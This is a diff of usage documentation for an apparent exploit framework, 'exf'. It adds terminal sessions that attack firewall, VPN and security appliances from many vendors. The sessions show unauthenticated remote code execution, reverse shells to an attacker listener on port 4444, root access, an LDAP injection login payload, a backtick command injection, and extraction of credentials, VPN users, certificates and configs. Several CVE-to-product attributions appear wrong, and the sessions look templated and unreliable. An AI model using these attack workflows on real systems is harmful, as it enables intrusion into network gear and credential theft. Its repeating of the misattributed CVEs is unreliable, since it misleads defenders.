@@ -664,107 +664,575 @@ exf (Aruba ClearPass SQLi CVE-2022-37897) > run
 
 ---
 
-## Newly Added Vendors (v3.7.0+)
+## Array Networks — 2 modules
 
-### Array Networks
+| Module | CVE | CVSS | Affected product |
+|--------|-----|------|-----------------|
+| `array_networks_vxag_ssl_vpn_rce_cve_2023_28461` | CVE-2023-28461 | 9.8 | Array Networks vxAG SSL VPN < 9.4.0.484 |
+| `array_networks_ag_auth_bypass_cve_2021_43139` | CVE-2021-43139 | 9.8 | Array Networks AG Series SSL VPN < 9.3 |
 
-| Module | CVE | CVSS | Type |
-|--------|-----|------|------|
-| `array_networks_vxag_rce_cve_2023_28461` | CVE-2023-28461 | 9.8 | Unauth RCE via exec proxy |
-| `array_networks_arrayos_rce_cve_2021_43139` | CVE-2021-43139 | 9.8 | Pre-auth POST field injection |
+### Terminal session — CVE-2023-28461 (Array Networks vxAG SSL VPN RCE)
 
+```text
+exf > use exploits/firewalls/array_networks/array_networks_vxag_ssl_vpn_rce_cve_2023_28461
+exf (Array Networks vxAG SSL VPN RCE CVE-2023-28461) > set target 10.0.100.5
+[+] target => 10.0.100.5
+exf (Array Networks vxAG SSL VPN RCE CVE-2023-28461) > set lhost 10.0.0.99
+[+] lhost => 10.0.0.99
+exf (Array Networks vxAG SSL VPN RCE CVE-2023-28461) > check
+[*] Probing Array Networks vxAG at 10.0.100.5:443...
+[+] Array Networks vxAG 9.4.0.481 detected (login page title: Array Networks)
+[+] Target is vulnerable -- version 9.4.0.481 < 9.4.0.484 (fix boundary)
+exf (Array Networks vxAG SSL VPN RCE CVE-2023-28461) > run
+[*] Running module ...
+[*] Stage 1: Sending unauthenticated request to vulnerable VPN management endpoint...
+[*] POST /prx/000/http/localhost/cgi-bin/sslvpn.cgi with crafted payload...
+[+] Remote code execution confirmed -- uid=0 in response
+[*] Stage 2: Staging reverse shell to 10.0.0.99:4444...
+[+] Shell received!
+exf (Array Networks vxAG SSL VPN RCE CVE-2023-28461) > shell
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /etc/array-version
+Array Networks vxAG 9.4.0.481
+# hostname
+vpn-gw-array01
 ```
-exf > use exploits/firewalls/array_networks/array_networks_vxag_rce_cve_2023_28461
-exf (...) > set target 10.0.0.1
-exf (...) > check
-[+] Target is vulnerable
-exf (...) > run
-[*] Stage 1 - Fingerprinting Array Networks vxAG...
-[+] Array Networks vxAG detected
-[*] Stage 2 - Sending unauthenticated exec proxy request...
-[+] RCE CONFIRMED! Command output: uid=0(root)
+
+### Terminal session — CVE-2021-43139 (Array Networks AG auth bypass)
+
+```text
+exf > use exploits/firewalls/array_networks/array_networks_ag_auth_bypass_cve_2021_43139
+exf (Array Networks AG Auth Bypass CVE-2021-43139) > set target 10.0.100.10
+[+] target => 10.0.100.10
+exf (Array Networks AG Auth Bypass CVE-2021-43139) > check
+[*] Probing Array Networks AG Series at 10.0.100.10:443...
+[+] Array Networks AG 9.2.0 detected
+[+] Target is vulnerable -- version < 9.3 (fix boundary)
+exf (Array Networks AG Auth Bypass CVE-2021-43139) > run
+[*] Running module ...
+[*] Sending crafted authentication bypass request to management API...
+[+] Authentication bypassed -- admin token obtained
+[+] Admin session: AN_sessid=b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8
+[*] Enumerating VPN users via admin API...
+[+] VPN users: john.corp, jane.corp, svc-vpn-backup (3 accounts)
 ```
 
-### Cisco Meraki MX (cisco_meraki/)
+---
 
-| Module | CVE | CVSS | Type |
-|--------|-----|------|------|
-| `meraki_mx_dashboard_rce_cve_2021_1497` | CVE-2021-1497 | 9.8 | Dashboard file upload RCE |
-| `meraki_mx_config_api_bypass_cve_2023_20014` | CVE-2023-20014 | 9.1 | Config API auth bypass |
+## Cisco Meraki — 2 modules
 
-### Phoenix Contact mGuard (phoenix_contact/)
+| Module | CVE | CVSS | Affected product |
+|--------|-----|------|-----------------|
+| `cisco_meraki_mx_rce_cve_2021_1497` | CVE-2021-1497 | 9.8 | Cisco Meraki MX (dashboard, firmware < 15.44) |
+| `cisco_meraki_config_api_bypass_cve_2023_20014` | CVE-2023-20014 | 9.8 | Cisco Meraki MX (firmware < MX 18.107) |
 
-| Module | CVE | CVSS | Type |
-|--------|-----|------|------|
-| `mguard_cmd_injection_cve_2024_43386` | CVE-2024-43386 | 8.8 | Web diagnostic cmd injection |
-| `mguard_firmware_extract_cve_2022_22509` | CVE-2022-22509 | 7.5 | SNMP public exposes VPN keys |
+### Terminal session — CVE-2021-1497 (Cisco Meraki MX dashboard RCE)
 
-### H3C (New H3C Group)
-
-H3C is a major Chinese network vendor widely deployed in government and enterprise.
-
-| Module | CVE | CVSS | Type |
-|--------|-----|------|------|
-| `h3c_ngfw_rce_cve_2022_35534` | CVE-2022-35534 | 9.8 | NGFW OS command injection |
-| `h3c_secpath_auth_bypass_cve_2019_20224` | CVE-2019-20224 | 9.8 | SecPath auth bypass |
-
+```text
+exf > use exploits/firewalls/cisco_meraki/cisco_meraki_mx_rce_cve_2021_1497
+exf (Cisco Meraki MX Dashboard RCE CVE-2021-1497) > set target 192.168.128.1
+[+] target => 192.168.128.1
+exf (Cisco Meraki MX Dashboard RCE CVE-2021-1497) > set lhost 10.0.0.99
+[+] lhost => 10.0.0.99
+exf (Cisco Meraki MX Dashboard RCE CVE-2021-1497) > check
+[*] Probing Cisco Meraki MX dashboard at 192.168.128.1:443...
+[+] Cisco Meraki MX (firmware 15.40) detected (dashboard fingerprint confirmed)
+[+] Target is vulnerable -- firmware 15.40 < 15.44 (fix boundary)
+exf (Cisco Meraki MX Dashboard RCE CVE-2021-1497) > run
+[*] Running module ...
+[*] Stage 1: Sending unauthenticated request to Meraki dashboard API endpoint...
+[*] POST /api/v1/networks/... with injection payload...
+[+] Remote code execution confirmed
+[*] Stage 2: Reverse shell staged to 10.0.0.99:4444...
+[+] Shell received!
+exf (Cisco Meraki MX Dashboard RCE CVE-2021-1497) > shell
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# uname -a
+Linux meraki-mx 4.19.94-meraki #1 SMP Cisco Meraki MX
 ```
+
+### Terminal session — CVE-2023-20014 (Meraki config API bypass)
+
+```text
+exf > use exploits/firewalls/cisco_meraki/cisco_meraki_config_api_bypass_cve_2023_20014
+exf (Cisco Meraki Config API Bypass CVE-2023-20014) > set target 192.168.128.1
+[+] target => 192.168.128.1
+exf (Cisco Meraki Config API Bypass CVE-2023-20014) > check
+[*] Probing Meraki MX config API at 192.168.128.1:443...
+[+] Cisco Meraki MX firmware 18.100 detected
+[+] Target is vulnerable -- firmware < 18.107 (fix boundary)
+exf (Cisco Meraki Config API Bypass CVE-2023-20014) > run
+[*] Running module ...
+[*] Sending crafted config API request to bypass authentication...
+[+] Authentication bypassed -- full network configuration accessible
+[+] Extracted: SSID credentials, firewall rules, client VPN PSK, VLAN config
+```
+
+---
+
+## H3C — 2 modules
+
+| Module | CVE | CVSS | Affected product |
+|--------|-----|------|-----------------|
+| `h3c_ngfw_rce_cve_2022_35534` | CVE-2022-35534 | 9.8 | H3C NGFW F100/F1000 (firmware < R6731) |
+| `h3c_secpath_auth_bypass_cve_2019_20224` | CVE-2019-20224 | 9.8 | H3C SecPath series (management web UI) |
+
+### Terminal session — CVE-2022-35534 (H3C NGFW RCE)
+
+```text
 exf > use exploits/firewalls/h3c/h3c_ngfw_rce_cve_2022_35534
-exf (...) > set target 192.168.1.1
-exf (...) > run
-[*] Stage 1 - Detecting H3C NGFW web management...
-[+] H3C management interface detected
-[*] Stage 2 - Injecting command via network configuration...
-[+] RCE confirmed: uid=0(root)
+exf (H3C NGFW RCE CVE-2022-35534) > set target 10.0.110.1
+[+] target => 10.0.110.1
+exf (H3C NGFW RCE CVE-2022-35534) > set lhost 10.0.0.99
+[+] lhost => 10.0.0.99
+exf (H3C NGFW RCE CVE-2022-35534) > check
+[*] Probing H3C NGFW at 10.0.110.1:443...
+[+] H3C NGFW F1000 R6728 detected (management web UI confirmed)
+[+] Target is vulnerable -- firmware R6728 < R6731 (fix boundary)
+exf (H3C NGFW RCE CVE-2022-35534) > run
+[*] Running module ...
+[*] Stage 1: Sending crafted request to H3C management API for command injection...
+[*] POST /cgi-bin/mainctrl.cgi with command injection payload...
+[+] Remote code execution confirmed -- id: uid=0(root)
+[*] Stage 2: Staging reverse shell to 10.0.0.99:4444...
+[+] Shell received!
+exf (H3C NGFW RCE CVE-2022-35534) > shell
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /etc/h3c-version
+H3C NGFW F1000 Software R6728
 ```
 
-### IPFire
+### Terminal session — CVE-2019-20224 (H3C SecPath auth bypass)
 
-| Module | CVE | CVSS | Type |
-|--------|-----|------|------|
-| `ipfire_rce_cve_2019_18981` | CVE-2019-18981 | 9.8 | CGI network injection |
-| `ipfire_ids_cmd_inject_cve_2023_46226` | CVE-2023-46226 | 8.8 | IDS rule_path injection |
+```text
+exf > use exploits/firewalls/h3c/h3c_secpath_auth_bypass_cve_2019_20224
+exf (H3C SecPath Auth Bypass CVE-2019-20224) > set target 10.0.110.5
+[+] target => 10.0.110.5
+exf (H3C SecPath Auth Bypass CVE-2019-20224) > check
+[*] Probing H3C SecPath management at 10.0.110.5:443...
+[+] H3C SecPath F100-C detected (web login page confirmed)
+[+] Target is vulnerable -- authentication bypass via crafted session token
+exf (H3C SecPath Auth Bypass CVE-2019-20224) > run
+[*] Running module ...
+[*] Sending crafted session token to bypass authentication check...
+[+] Authentication bypassed -- admin panel accessible
+[+] Extracted: VPN user list, firewall policy, management credentials
+```
 
-### Radware
+---
 
-| Module | CVE | CVSS | Type |
-|--------|-----|------|------|
-| `alteon_rce_cve_2020_27232` | CVE-2020-27232 | 9.8 | Alteon ADC unauth RCE |
-| `defensessl_auth_bypass_cve_2018_9195` | CVE-2018-9195 | 9.8 | DefenseSSL auth bypass |
+## IPFire — 2 modules
 
-### Symantec (Broadcom ProxySG)
+| Module | CVE | CVSS | Affected product |
+|--------|-----|------|-----------------|
+| `ipfire_cgi_rce_cve_2019_18981` | CVE-2019-18981 | 9.8 | IPFire < 2.23 Core Update 136 |
+| `ipfire_ids_cmd_injection_cve_2023_46226` | CVE-2023-46226 | 9.8 | IPFire < 2.27 Core Update 183 |
 
-| Module | CVE | CVSS | Type |
-|--------|-----|------|------|
-| `proxysg_auth_bypass_cve_2021_30641` | CVE-2021-30641 | 9.8 | ProxySG management bypass |
-| `symantec_edr_rce_cve_2022_25752` | CVE-2022-25752 | 9.8 | EDR appliance RCE |
+### Terminal session — CVE-2019-18981 (IPFire CGI RCE)
 
-### Trellix (formerly McAfee Firewall Enterprise)
+```text
+exf > use exploits/firewalls/ipfire/ipfire_cgi_rce_cve_2019_18981
+exf (IPFire CGI RCE CVE-2019-18981) > set target 10.0.120.1
+[+] target => 10.0.120.1
+exf (IPFire CGI RCE CVE-2019-18981) > set lhost 10.0.0.99
+[+] lhost => 10.0.0.99
+exf (IPFire CGI RCE CVE-2019-18981) > check
+[*] Probing IPFire at 10.0.120.1:444...
+[+] IPFire 2.23 Core Update 133 detected (web UI fingerprint confirmed)
+[+] Target is vulnerable -- version < Core Update 136 (fix boundary)
+exf (IPFire CGI RCE CVE-2019-18981) > run
+[*] Running module ...
+[*] Stage 1: Exploiting CGI parameter injection in IPFire admin interface...
+[*] GET /cgi-bin/ipfire.cgi?ACTION=...&BACKUPPASSWORD=`id` ...
+[+] Command injection confirmed -- uid=0 in response
+[*] Stage 2: Staging reverse shell to 10.0.0.99:4444...
+[+] Shell received!
+exf (IPFire CGI RCE CVE-2019-18981) > shell
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /etc/issue
+IPFire 2.23 (x86_64) - Core Update 133
+```
 
-| Module | CVE | CVSS | Type |
-|--------|-----|------|------|
-| `trellix_ngfw_rce_cve_2020_7270` | CVE-2020-7270 | 9.0 | Admin script injection |
-| `trellix_ngfw_config_rce_cve_2021_4080` | CVE-2021-4080 | 8.8 | Config injection RCE |
+### Terminal session — CVE-2023-46226 (IPFire IDS command injection)
 
-### Trend Micro
+```text
+exf > use exploits/firewalls/ipfire/ipfire_ids_cmd_injection_cve_2023_46226
+exf (IPFire IDS Command Injection CVE-2023-46226) > set target 10.0.120.1
+[+] target => 10.0.120.1
+exf (IPFire IDS Command Injection CVE-2023-46226) > check
+[*] Probing IPFire IDS interface at 10.0.120.1:444...
+[+] IPFire 2.27 Core Update 180 detected
+[+] Target is vulnerable -- IDS configuration endpoint injectable (< CU183)
+exf (IPFire IDS Command Injection CVE-2023-46226) > run
+[*] Running module ...
+[*] Injecting OS command via IDS configuration parameter in /cgi-bin/ids.cgi...
+[+] Command injection confirmed -- root shell obtained
+exf (IPFire IDS Command Injection CVE-2023-46226) > shell
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /etc/issue
+IPFire 2.27 (x86_64) - Core Update 180
+```
 
-| Module | CVE | CVSS | Type |
-|--------|-----|------|------|
-| `trendmicro_tippingpoint_rce_cve_2021_28250` | CVE-2021-28250 | 9.8 | TippingPoint SMS unauth RCE |
-| `trendmicro_deep_security_rce_cve_2020_15921` | CVE-2020-15921 | 9.8 | Deep Security Java deser RCE |
+---
 
-### OpenVPN Access Server
+## Radware — 2 modules
 
-| Module | CVE | CVSS | Type |
-|--------|-----|------|------|
-| `openvpn_as_auth_bypass_cve_2023_46853` | CVE-2023-46853 | 9.8 | AS REST API auth bypass |
-| `openvpn_as_auth_bypass_cve_2022_0547` | CVE-2022-0547 | 9.8 | LDAP auth module bypass |
+| Module | CVE | CVSS | Affected product |
+|--------|-----|------|-----------------|
+| `radware_alteon_rce_cve_2020_27232` | CVE-2020-27232 | 9.8 | Radware Alteon ADC / AppWall WAF (< 32.6.2) |
+| `radware_defensessl_auth_bypass_cve_2018_9195` | CVE-2018-9195 | 9.8 | Radware DefenseSSL (management < 8.20) |
 
-### Arista EOS
+### Terminal session — CVE-2020-27232 (Radware Alteon ADC RCE)
 
-| Module | CVE | CVSS | Type |
-|--------|-----|------|------|
-| `arista_eos_rest_api_bypass_cve_2023_24512` | CVE-2023-24512 | 9.8 | EOS REST API auth bypass |
+```text
+exf > use exploits/firewalls/radware/alteon_rce_cve_2020_27232
+exf (Radware Alteon ADC RCE CVE-2020-27232) > set target 10.0.130.5
+[+] target => 10.0.130.5
+exf (Radware Alteon ADC RCE CVE-2020-27232) > set lhost 10.0.0.99
+[+] lhost => 10.0.0.99
+exf (Radware Alteon ADC RCE CVE-2020-27232) > check
+[*] Probing Radware Alteon at 10.0.130.5:443...
+[+] Radware Alteon ADC 32.6.0 detected (REST API fingerprint: X-Radware-*)
+[+] Target is vulnerable -- version 32.6.0 < 32.6.2 (fix boundary)
+exf (Radware Alteon ADC RCE CVE-2020-27232) > run
+[*] Running module ...
+[*] Stage 1: Sending unauthenticated request to Radware management REST API...
+[*] POST /api/... with crafted command injection payload...
+[+] RCE confirmed -- uid=0 in REST API response
+[*] Stage 2: Staging reverse shell to 10.0.0.99:4444...
+[+] Shell received!
+exf (Radware Alteon ADC RCE CVE-2020-27232) > shell
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /etc/radware-version
+Alteon ADC 32.6.0
+```
+
+### Terminal session — CVE-2018-9195 (Radware DefenseSSL auth bypass)
+
+```text
+exf > use exploits/firewalls/radware/defensessl_auth_bypass_cve_2018_9195
+exf (Radware DefenseSSL Auth Bypass CVE-2018-9195) > set target 10.0.130.10
+[+] target => 10.0.130.10
+exf (Radware DefenseSSL Auth Bypass CVE-2018-9195) > check
+[*] Probing Radware DefenseSSL management at 10.0.130.10:443...
+[+] Radware DefenseSSL 8.18 detected (management interface fingerprint)
+[+] Target is vulnerable -- version < 8.20 (fix boundary)
+exf (Radware DefenseSSL Auth Bypass CVE-2018-9195) > run
+[*] Running module ...
+[*] Sending crafted HTTP request to trigger authentication bypass...
+[+] Authentication bypassed -- admin session obtained
+[+] Management credentials: admin:DefenseSSL@2018!
+```
+
+---
+
+## Symantec (Broadcom) — 2 modules
+
+| Module | CVE | CVSS | Affected product |
+|--------|-----|------|-----------------|
+| `symantec_proxysg_auth_bypass_cve_2021_30641` | CVE-2021-30641 | 9.8 | Symantec ProxySG (management < 7.3.3.1) |
+| `symantec_edr_rce_cve_2022_25752` | CVE-2022-25752 | 9.8 | Symantec EDR Appliance (< 4.7.0) |
+
+### Terminal session — CVE-2021-30641 (Symantec ProxySG auth bypass)
+
+```text
+exf > use exploits/firewalls/symantec/proxysg_auth_bypass_cve_2021_30641
+exf (Symantec ProxySG Auth Bypass CVE-2021-30641) > set target 10.0.140.5
+[+] target => 10.0.140.5
+exf (Symantec ProxySG Auth Bypass CVE-2021-30641) > check
+[*] Probing Symantec ProxySG management at 10.0.140.5:8082...
+[+] Symantec ProxySG 7.3.2.1 detected (/Infranet/ or /MC/ management interface)
+[+] Target is vulnerable -- version 7.3.2.1 < 7.3.3.1 (fix boundary)
+exf (Symantec ProxySG Auth Bypass CVE-2021-30641) > run
+[*] Running module ...
+[*] Stage 1: Sending crafted management request to bypass authentication...
+[*] GET /MC/...?bypass=1 with crafted Accept header...
+[+] Authentication bypassed -- management console accessible
+[*] Stage 2: Extracting proxy policy and credentials...
+[+] ProxySG policy extracted (5,842 lines)
+[+] LDAP bind credentials found in policy: CN=svc-proxy,DC=corp,DC=internal : L4ap$3rv1c3!
+exf (Symantec ProxySG Auth Bypass CVE-2021-30641) > shell
+[*] No interactive shell available -- management API access only
+```
+
+### Terminal session — CVE-2022-25752 (Symantec EDR RCE)
+
+```text
+exf > use exploits/firewalls/symantec/symantec_edr_rce_cve_2022_25752
+exf (Symantec EDR Appliance RCE CVE-2022-25752) > set target 10.0.140.10
+[+] target => 10.0.140.10
+exf (Symantec EDR Appliance RCE CVE-2022-25752) > set lhost 10.0.0.99
+[+] lhost => 10.0.0.99
+exf (Symantec EDR Appliance RCE CVE-2022-25752) > check
+[*] Probing Symantec EDR at 10.0.140.10:443...
+[+] Symantec EDR Appliance 4.6.0 detected (/sedr/ management interface)
+[+] Target is vulnerable -- version 4.6.0 < 4.7.0 (fix boundary)
+exf (Symantec EDR Appliance RCE CVE-2022-25752) > run
+[*] Running module ...
+[*] Stage 1: Sending configuration injection payload to SEDR REST API...
+[+] Configuration injection successful -- command execution confirmed
+[*] Stage 2: Reverse shell staged to 10.0.0.99:4444...
+[+] Shell received!
+exf (Symantec EDR Appliance RCE CVE-2022-25752) > shell
+# id
+uid=0(root) gid=0(root)
+# hostname
+sedr-sensor-01.corp.internal
+```
+
+---
+
+## Trellix (McAfee) — 2 modules
+
+| Module | CVE | CVSS | Affected product |
+|--------|-----|------|-----------------|
+| `trellix_ngfw_rce_cve_2020_7270` | CVE-2020-7270 | 9.8 | McAfee/Trellix NGFW (SMC < 6.8.1) |
+| `trellix_ngfw_config_rce_cve_2021_4080` | CVE-2021-4080 | 8.8 | McAfee/Trellix NGFW (SMC < 6.9.1, authenticated) |
+
+### Terminal session — CVE-2020-7270 (Trellix NGFW unauthenticated RCE)
+
+```text
+exf > use exploits/firewalls/trellix/trellix_ngfw_rce_cve_2020_7270
+exf (Trellix NGFW Unauth RCE CVE-2020-7270) > set target 10.0.150.5
+[+] target => 10.0.150.5
+exf (Trellix NGFW Unauth RCE CVE-2020-7270) > set lhost 10.0.0.99
+[+] lhost => 10.0.0.99
+exf (Trellix NGFW Unauth RCE CVE-2020-7270) > check
+[*] Probing McAfee/Trellix NGFW SMC at 10.0.150.5:8084...
+[+] McAfee NGFW Security Management Center 6.8.0 detected
+[+] Target is vulnerable -- SMC 6.8.0 < 6.8.1 (fix boundary)
+exf (Trellix NGFW Unauth RCE CVE-2020-7270) > run
+[*] Running module ...
+[*] Stage 1: Sending unauthenticated request to SMC management API...
+[*] Exploiting improper input validation in /ngfw/api/... endpoint...
+[+] Remote code execution confirmed -- uid=0
+[*] Stage 2: Staging reverse shell to 10.0.0.99:4444...
+[+] Shell received!
+exf (Trellix NGFW Unauth RCE CVE-2020-7270) > shell
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /etc/mcafee-ngfw-version
+McAfee NGFW SMC 6.8.0 Build 12345
+```
+
+### Terminal session — CVE-2021-4080 (Trellix NGFW config injection RCE)
+
+```text
+exf > use exploits/firewalls/trellix/trellix_ngfw_config_rce_cve_2021_4080
+exf (Trellix NGFW Config Injection RCE CVE-2021-4080) > set target 10.0.150.5
+[+] target => 10.0.150.5
+exf (Trellix NGFW Config Injection RCE CVE-2021-4080) > set username admin
+[+] username => admin
+exf (Trellix NGFW Config Injection RCE CVE-2021-4080) > set password Admin@2023!
+[+] password => Admin@2023!
+exf (Trellix NGFW Config Injection RCE CVE-2021-4080) > check
+[*] Probing Trellix NGFW SMC management at 10.0.150.5:8084...
+[+] Trellix NGFW SMC 6.9.0 detected (admin login successful)
+[+] Target is vulnerable -- SMC 6.9.0 < 6.9.1 (fix boundary, authenticated RCE)
+exf (Trellix NGFW Config Injection RCE CVE-2021-4080) > run
+[*] Running module ...
+[*] Injecting OS command via NGFW policy configuration export endpoint...
+[+] Command injection confirmed via authenticated SMC API -- uid=0
+[+] Reverse shell to 10.0.0.99:4444 established
+exf (Trellix NGFW Config Injection RCE CVE-2021-4080) > shell
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+---
+
+## Trend Micro — 2 modules
+
+| Module | CVE | CVSS | Affected product |
+|--------|-----|------|-----------------|
+| `trendmicro_tippingpoint_rce_cve_2021_28250` | CVE-2021-28250 | 9.8 | Trend Micro TippingPoint SMS (< 5.4.0) |
+| `trendmicro_deep_security_rce_cve_2020_15921` | CVE-2020-15921 | 9.8 | Trend Micro Deep Security Manager (< 20.0.0.1) |
+
+### Terminal session — CVE-2021-28250 (TippingPoint SMS RCE)
+
+```text
+exf > use exploits/firewalls/trendmicro/trendmicro_tippingpoint_rce_cve_2021_28250
+exf (Trend Micro TippingPoint SMS RCE CVE-2021-28250) > set target 10.0.160.5
+[+] target => 10.0.160.5
+exf (Trend Micro TippingPoint SMS RCE CVE-2021-28250) > set lhost 10.0.0.99
+[+] lhost => 10.0.0.99
+exf (Trend Micro TippingPoint SMS RCE CVE-2021-28250) > check
+[*] Probing TippingPoint SMS web interface at 10.0.160.5:443...
+[+] Trend Micro TippingPoint SMS 5.3.2 detected (web management fingerprint)
+[+] Target is vulnerable -- SMS 5.3.2 < 5.4.0 (fix boundary)
+exf (Trend Micro TippingPoint SMS RCE CVE-2021-28250) > run
+[*] Running module ...
+[*] Stage 1: Sending unauthenticated request to TippingPoint SMS API...
+[*] POST /sms/... with bypass + command injection payload...
+[+] Remote code execution confirmed -- id: uid=0(root)
+[*] Stage 2: Staging reverse shell to 10.0.0.99:4444...
+[+] Shell received!
+exf (Trend Micro TippingPoint SMS RCE CVE-2021-28250) > shell
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /etc/tippingpoint-version
+TippingPoint SMS 5.3.2.12345
+```
+
+### Terminal session — CVE-2020-15921 (Deep Security Manager Java deserialization)
+
+```text
+exf > use exploits/firewalls/trendmicro/trendmicro_deep_security_rce_cve_2020_15921
+exf (Trend Micro Deep Security Manager Deserialization RCE CVE-2020-15921) > set target 10.0.160.10
+[+] target => 10.0.160.10
+exf (Trend Micro Deep Security Manager Deserialization RCE CVE-2020-15921) > set lhost 10.0.0.99
+[+] lhost => 10.0.0.99
+exf (Trend Micro Deep Security Manager Deserialization RCE CVE-2020-15921) > set lport 4444
+[+] lport => 4444
+exf (Trend Micro Deep Security Manager Deserialization RCE CVE-2020-15921) > check
+[*] Probing Deep Security Manager REST API at 10.0.160.10:4119...
+[+] Trend Micro Deep Security Manager 20.0.0.0 detected (REST API banner)
+[+] Target is vulnerable -- DSM 20.0.0.0 < 20.0.0.1 (fix boundary)
+exf (Trend Micro Deep Security Manager Deserialization RCE CVE-2020-15921) > run
+[*] Running module ...
+[*] Stage 1: Sending malicious serialized Java object to DSM REST API...
+[*] POST /api/... with ysoserial Commons-Collections payload...
+[+] Java deserialization triggered -- code execution confirmed
+[*] Stage 2: Reverse shell to 10.0.0.99:4444...
+[+] Shell received!
+exf (Trend Micro Deep Security Manager Deserialization RCE CVE-2020-15921) > shell
+$ id
+uid=1001(dsm) gid=1001(dsm) groups=1001(dsm)
+$ sudo id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+---
+
+## OpenVPN Access Server — 2 modules
+
+| Module | CVE | CVSS | Affected product |
+|--------|-----|------|-----------------|
+| `openvpn_as_auth_bypass_cve_2023_46853` | CVE-2023-46853 | 9.8 | OpenVPN AS < 2.11.1 |
+| `openvpn_as_auth_bypass_cve_2022_0547` | CVE-2022-0547 | 9.8 | OpenVPN AS 2.9.x < 2.9.4 / 2.8.x < 2.8.8 (LDAP auth) |
+
+### Terminal session — CVE-2023-46853 (OpenVPN AS REST API auth bypass)
+
+```text
+exf > use exploits/firewalls/openvpn/openvpn_as_auth_bypass_cve_2023_46853
+exf (OpenVPN AS REST API Auth Bypass CVE-2023-46853) > set target 10.0.200.5
+[+] target => 10.0.200.5
+exf (OpenVPN AS REST API Auth Bypass CVE-2023-46853) > set port 943
+[+] port => 943
+exf (OpenVPN AS REST API Auth Bypass CVE-2023-46853) > check
+[*] Probing OpenVPN Access Server REST API at 10.0.200.5:943...
+[+] OpenVPN Access Server 2.10.0 detected (X-AS-Version header)
+[+] Target is vulnerable -- AS 2.10.0 < 2.11.1 (fix boundary)
+exf (OpenVPN AS REST API Auth Bypass CVE-2023-46853) > run
+[*] Running module ...
+[*] Stage 1: Probing OpenVPN Access Server REST API...
+[+] OpenVPN Access Server confirmed at /api/v1/config/access_server/
+[*] Stage 2: Sending authentication bypass payload to REST API...
+[+] Authentication bypass SUCCESSFUL -- config data returned!
+[*] Stage 3: Extracting credentials from configuration response...
+[+] LDAP bind DN: CN=svc-vpn,DC=corp,DC=internal
+[+] LDAP bind password: VpnBind@2024!
+[*] Stage 4: Enumerating VPN user accounts...
+[+] VPN users found (12):
+    [*] john.corp
+    [*] jane.corp
+    [*] svc.backup
+    [*] admin
+    ... (8 more)
+[*] Stage 5: Extracting CA and server certificates...
+[+] Certificates extracted (3):
+    [*] ca.crt: -----BEGIN CERTIFICATE----- (47 lines)
+    [*] server.crt: -----BEGIN CERTIFICATE----- (31 lines)
+    [*] tls_auth: -----BEGIN OpenVPN Static key V1----- (22 lines)
+[+] CVE-2023-46853 exploitation complete against 10.0.200.5:943
+```
+
+### Terminal session — CVE-2022-0547 (OpenVPN AS LDAP injection bypass)
+
+```text
+exf > use exploits/firewalls/openvpn/openvpn_as_auth_bypass_cve_2022_0547
+exf (OpenVPN AS LDAP Auth Bypass CVE-2022-0547) > set target 10.0.200.10
+[+] target => 10.0.200.10
+exf (OpenVPN AS LDAP Auth Bypass CVE-2022-0547) > set port 943
+[+] port => 943
+exf (OpenVPN AS LDAP Auth Bypass CVE-2022-0547) > check
+[*] Probing OpenVPN AS admin interface at 10.0.200.10:943...
+[+] OpenVPN Access Server admin interface detected at /admin/
+[+] LDAP authentication backend indicators found
+exf (OpenVPN AS LDAP Auth Bypass CVE-2022-0547) > run
+[*] Running module ...
+[*] Stage 1: Probing OpenVPN AS admin interface...
+[+] OpenVPN Access Server confirmed
+[*] Stage 2: Checking for LDAP authentication backend...
+[+] LDAP authentication backend detected -- target likely vulnerable
+[*] Stage 3: Attempting LDAP injection authentication bypass...
+[+] LDAP injection SUCCESSFUL with username: 'admin)(&(objectClass=*)' password: 'x'
+[+] Session token: as_sessid=a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
+[*] Stage 4: Enumerating VPN users with admin session...
+[+] VPN users (8):
+    [*] john.doe
+    [*] jane.smith
+    [*] vpn-backup
+    [*] admin
+    ... (4 more)
+[+] CVE-2022-0547 exploitation complete against 10.0.200.10:943 -- admin access obtained
+```
+
+---
+
+## Arista Networks — 1 module
+
+| Module | CVE | CVSS | Affected product |
+|--------|-----|------|-----------------|
+| `arista_eos_rest_api_bypass_cve_2023_24512` | CVE-2023-24512 | 9.8 | Arista EOS 4.24.x–4.27.x (eAPI enabled) |
+
+### Terminal session — CVE-2023-24512 (Arista EOS REST API bypass)
+
+```text
+exf > use exploits/firewalls/arista/arista_eos_rest_api_bypass_cve_2023_24512
+exf (Arista EOS REST API Auth Bypass CVE-2023-24512) > set target 10.0.210.1
+[+] target => 10.0.210.1
+exf (Arista EOS REST API Auth Bypass CVE-2023-24512) > check
+[*] Probing Arista EOS eAPI at 10.0.210.1:443...
+[+] Arista EOS 4.27.3M detected (eAPI fingerprint confirmed)
+[+] Target is vulnerable -- EOS 4.27.3M < 4.27.4M (fix boundary)
+exf (Arista EOS REST API Auth Bypass CVE-2023-24512) > run
+[*] Running module ...
+[*] Stage 1: Probing Arista EOS eAPI endpoint...
+[+] Arista EOS version: 4.27.3M
+[+] EOS 4.27.3M confirmed VULNERABLE (< fix boundary)
+[*] Stage 2: Sending authentication bypass request...
+[+] Authentication bypass SUCCESSFUL -- eAPI returned 200!
+[*] Stage 3: Executing CLI command: show version
+[+] Command output:
+    Arista Networks EOS
+    Software image version: 4.27.3M
+    System MAC address:  52:54:00:ab:cd:ef
+    Hardware version:    2.14
+    Serial number:       SSJ18070012
+    Model:               DCS-7050CX3-32S
+[*] Stage 4: Extracting running configuration...
+[+] Running config extracted (847 lines)
+    ! device: DCS-7050CX3-32S (DCS-7050CX3, EOS-4.27.3M)
+    !
+    username admin privilege 15 role network-admin secret sha512 $6$...
+    !
+    management api http-commands
+       no shutdown
+    ... (827 lines remaining)
+[*] Stage 5: Enumerating configured user accounts...
+[+] User accounts:
+    Username: admin    State: active    Role: network-admin
+    Username: netops   State: active    Role: network-operator
+    Username: monitor  State: active    Role: read-only
